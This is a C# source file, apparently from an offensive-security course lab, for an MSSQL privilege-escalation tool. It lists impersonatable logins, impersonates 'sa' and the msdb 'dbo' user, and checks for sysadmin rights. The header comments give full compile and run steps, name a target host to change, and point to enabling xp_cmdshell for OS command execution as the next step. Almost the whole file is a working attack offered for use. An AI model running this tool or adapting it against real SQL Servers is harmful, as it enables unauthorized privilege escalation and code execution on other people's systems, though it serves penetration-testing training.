// ================================================================
// ComprehensiveImpersonation.cs — MSSQL Login and User Impersonation Tester
// ================================================================
// WHAT THIS DOES:
//   Connects to a SQL Server and performs comprehensive impersonation testing.
//   Demonstrates two types of SQL Server impersonation that can lead to
//   privilege escalation:
//
//   1. SERVER-LEVEL IMPERSONATION (EXECUTE AS LOGIN = 'sa'):
//      Switches the SQL connection context to the 'sa' (sysadmin) account.
//      If your user has IMPERSONATE permission on 'sa', you become sysadmin
//      for the duration of that context. Can enable xp_cmdshell as SA.
//
//   2. DATABASE-LEVEL IMPERSONATION (EXECUTE AS USER = 'dbo' in msdb):
//      Switches the database user context to 'dbo' in the msdb database.
//      The 'dbo' user in msdb often has elevated database-level permissions.
//      Some SQL Server configurations grant sysadmin via msdb trustworthiness.
//
//   For each impersonation type, the tool shows:
//     - Current user BEFORE impersonation
//     - Current user AFTER impersonation
//     - Whether you are a sysadmin after impersonation
//   Then reverts the context with REVERT.
//
//   Also enumerates which logins you can impersonate in the first place.
//
// ----------------------------------------------------------------
// BEFORE YOU RUN — CHANGE THESE VALUES
// ----------------------------------------------------------------
//   string sqlServer = "dc01.corp1.com"   -> SQL Server FQDN or IP
//   string database  = "master"           -> leave as "master" for server-level tests
//
//   If you find a different login to impersonate (not 'sa'), change:
//     ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';");
//   To:
//     ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'YourFoundLogin';");
//
// ----------------------------------------------------------------
// COMPILE
// ----------------------------------------------------------------
//
//   OPTION A — Command line (Windows):
//     C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe ^
//       /out:ComprehensiveImpersonation.exe ComprehensiveImpersonation.cs
//
//   OPTION B — Visual Studio:
//     1. File -> New -> Project -> Console App (.NET Framework) -> Next
//     2. Name it "ComprehensiveImpersonation", Framework: .NET Framework 4.x
//     3. Delete all code in Program.cs, paste THIS ENTIRE FILE
//     4. Build -> Build Solution (Ctrl+Shift+B)
//     5. Find: bin\Debug\ComprehensiveImpersonation.exe
//
// ----------------------------------------------------------------
// RUN
// ----------------------------------------------------------------
//   .\ComprehensiveImpersonation.exe
//   (Uses Windows Integrated Authentication — current user's domain credentials)
//
// INTERPRETING OUTPUT:
//   "Logins that can be impersonated: sa" -> you can impersonate 'sa' (sysadmin)!
//   "sysadmin membership: 1" after impersonation -> you are now sysadmin
//   "sysadmin membership: 0" -> you are NOT sysadmin in this context
//
// NEXT STEPS IF IMPERSONATION WORKS:
//   After confirming impersonation, use sql-v2.cs or mssql-runner.cs with /i:sa
//   to enable xp_cmdshell and get OS command execution as sysadmin.
//
// BEFORE RUNNING, CHANGE:
//   - sqlServer -> your target SQL Server hostname/IP
// ================================================================
using System;
using System.Data.SqlClient;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            string sqlServer = "dc01.corp1.com";
            string database = "master";

            string conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            using (SqlConnection con = new SqlConnection(conString))
            {
                try
                {
                    con.Open();
                    Console.WriteLine("Auth success!");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Auth failed: " + ex.Message);
                    Environment.Exit(0);
                }

                // 1. Enumerate logins that can be impersonated (as per course material)
                Console.WriteLine("\n--- Enumerating impersonatable logins ---");
                string impersonateQuery = @"
                    SELECT DISTINCT b.name
                    FROM sys.server_permissions a
                    INNER JOIN sys.server_principals b
                    ON a.grantor_principal_id = b.principal_id
                    WHERE a.permission_name = 'IMPERSONATE';";

                using (SqlCommand cmd = new SqlCommand(impersonateQuery, con))
                {
                    using (SqlDataReader reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            Console.WriteLine("Logins that can be impersonated: " + reader[0]);
                        }
                        reader.Close();
                    }
                }

                // 2. Server-level impersonation of 'sa'
                Console.WriteLine("\n--- Testing server-level impersonation of 'sa' ---");
                try
                {
                    // Before impersonation
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Executing in the context of (before): ");

                    // Perform impersonation
                    ExecuteNonQuery(con, "EXECUTE AS LOGIN = 'sa';");

                    // After impersonation
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Executing in the context of (after): ");
                    ExecuteScalarQuery(con, "SELECT IS_SRVROLEMEMBER('sysadmin');", "sysadmin membership: ");

                    // Revert
                    ExecuteNonQuery(con, "REVERT;");
                    ExecuteScalarQuery(con, "SELECT SYSTEM_USER;", "Context after REVERT: ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Server-level impersonation failed: " + ex.Message);
                    // Ensure reversion even on error
                    try { ExecuteNonQuery(con, "REVERT;"); } catch { }
                }

                // 3. Database-level impersonation of 'dbo' in msdb
                Console.WriteLine("\n--- Testing database-level impersonation of 'dbo' in msdb ---");
                try
                {
                    // Before impersonation (in current database)
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user (before): ");

                    // Perform impersonation in msdb
                    ExecuteNonQuery(con, "USE msdb; EXECUTE AS USER = 'dbo';");

                    // After impersonation
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user (after): ");
                    ExecuteScalarQuery(con, "SELECT IS_SRVROLEMEMBER('sysadmin');", "sysadmin membership: ");

                    // Revert
                    ExecuteNonQuery(con, "REVERT;");
                    ExecuteScalarQuery(con, "SELECT USER_NAME();", "Database user after REVERT: ");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Database-level impersonation failed: " + ex.Message);
                    // Ensure reversion even on error
                    try { ExecuteNonQuery(con, "REVERT;"); } catch { }
                }

                con.Close();
            }

            Console.WriteLine("\nDone.");
        }

        // Helper to execute a query returning a single value
        static void ExecuteScalarQuery(SqlConnection con, string query, string label)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                object result = cmd.ExecuteScalar();
                Console.WriteLine(label + result);
            }
        }

        // Helper to execute a non-query statement
        static void ExecuteNonQuery(SqlConnection con, string query)
        {
            using (SqlCommand cmd = new SqlCommand(query, con))
            {
                cmd.ExecuteNonQuery();
            }
        }
    }
}
